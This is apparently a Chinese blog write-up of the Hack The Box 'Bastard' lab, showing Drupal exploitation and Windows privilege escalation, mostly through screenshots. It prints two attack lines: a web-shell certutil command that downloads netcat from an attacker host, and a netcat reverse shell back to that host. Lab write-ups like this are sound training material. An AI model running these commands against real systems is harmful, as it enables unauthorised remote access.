+++
title = '0X001 Bastard'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描：

![](/htb_img/WEBRESOURCEb3d7a7acb7f5875803b8d77d07427b3eimage.png)

![](/htb_img/WEBRESOURCE47f3572f4d6819bed9f11b147ff33718image.png)

## 获取立足点

![](/htb_img/WEBRESOURCE0adc3946b4962d062d144b04c4b91882image.png)

![](/htb_img/WEBRESOURCE4771da8485050d5158dfe97c2d6a81dcimage.png)

版本是7.54：

![](/htb_img/WEBRESOURCEacfa99ca7197578961cf197a69b65897image.png)

判断一下，基本能用的就这些：

![](/htb_img/WEBRESOURCEd9ef537a0ef532d40abd2a39e7d78db3image.png)

第一个遇到需要寻找一个端点，来进行渗透测试：

![](/htb_img/WEBRESOURCE361f32b7cee278d6e2397924972769e7image.png)

通过gobuster发现node：

![](/htb_img/WEBRESOURCE2d914653c97c19b2474e340f7c0ee87eimage.png)

对该目录接着进行扫描，发现01：

![](/htb_img/WEBRESOURCE060b2eecf0df2aa12ed8723373928449image.png)

访问一下：

![](/htb_img/WEBRESOURCE75bad0944eda4e2d29aea5db9b89368bimage.png)

点击：

![](/htb_img/WEBRESOURCE204736d39eca3b90bbe5da6e8ca0cac3image.png)

把rest和rest_endpoint输入进去：

![](/htb_img/WEBRESOURCEde39c6c08041508ae9b3c72f521ba4e8image.png)

执行成功：

![](/htb_img/WEBRESOURCE4b89a0370927b80ba773bb5027f6b820image.png)

替换代码：

![](/htb_img/WEBRESOURCE1272b51816c79b770e4d253ff22071b8image.png)

执行：

![](/htb_img/WEBRESOURCE34510262979338e66fe15a8a177eb07bimage.png)

上传nc:

http://10.10.10.9/cxk.php?cxk=certutil -urlcache -split -f http://10.10.16.4/nc64.exe C:\Windows\Temp\b.exe

![](/htb_img/WEBRESOURCEb8ea0f9ba79c3e54cba1450d84b8f819image.png)

反弹shell:

start C:\Windows\Temp\b.exe -e cmd.exe 10.10.16.4 9999 

![](/htb_img/WEBRESOURCEe858889d3ce85b26fab611d93873b3adimage.png)

用第二个rb的脚本也是可以的：

![](/htb_img/WEBRESOURCE54d3e3046eaf9f5cabaa77e51418c19cimage.png)

![](/htb_img/WEBRESOURCE42d10c5ffacaba987b93e0f00f09e691image.png)

# 提权

![](/htb_img/WEBRESOURCE71fa67f3fe83b1240de15a3f64eccc75image.png)

ipconfig:

![](/htb_img/WEBRESOURCE2528263ca52659ee556d6737843b160bimage.png)

user.txt:

![](/htb_img/WEBRESOURCEf041f9aa2ccbe14d09898aa6c26c4a4dimage.png)

运行我们的脚本：

[https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9](https://github.com/carlospolop/PEASS-ng/releases/tag/20231224-836b4ac9)

winpeass

![](/htb_img/WEBRESOURCE30cf72f1f7eee915348c9f0040ea73bfimage.png)

其实也得看一下这些里面哪些是常用的，和有EXP的：

[https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)

[https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051)

这里选一个，用得比较多的：

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools

![](/htb_img/WEBRESOURCE1f2fdbda2c12a9e9dec250061c236c4aimage.png)

：

![](/htb_img/WEBRESOURCEcb192e824d8e6394c4fb1b69ce8202c3image.png)

![](/htb_img/WEBRESOURCE865b7c59908b42faeccdaed093d08e1cimage.png)

![](/htb_img/WEBRESOURCEcbbe6ce19698e72975af06cbb985d0dfimage.png)